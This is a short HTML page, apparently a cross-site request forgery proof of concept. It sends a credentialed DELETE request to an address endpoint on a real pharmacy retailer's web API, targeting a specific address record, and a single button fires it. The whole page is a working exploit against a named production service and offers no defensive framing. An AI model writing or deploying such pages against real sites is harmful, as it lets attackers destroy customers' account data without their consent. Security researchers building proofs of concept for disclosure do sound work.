<!DOCTYPE html>
<html>
  <body>
    <h1>Manual CSRF DELETE Trigger</h1>
    <button onclick="triggerDelete()">Send DELETE Request</button>

    <script>
      function triggerDelete() {
        fetch("https://www.redcare-pharmacie.fr/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947", {
          method: "DELETE",
          credentials: "include", // required to send cookies
          headers: {
            "Accept": "application/json",
            "Content-Type": "application/json"
          }
        }).then(response => response.text())
          .then(data => console.log("Response:", data))
          .catch(err => console.error("Error:", err));
      }
    </script>
  </body>
</html>
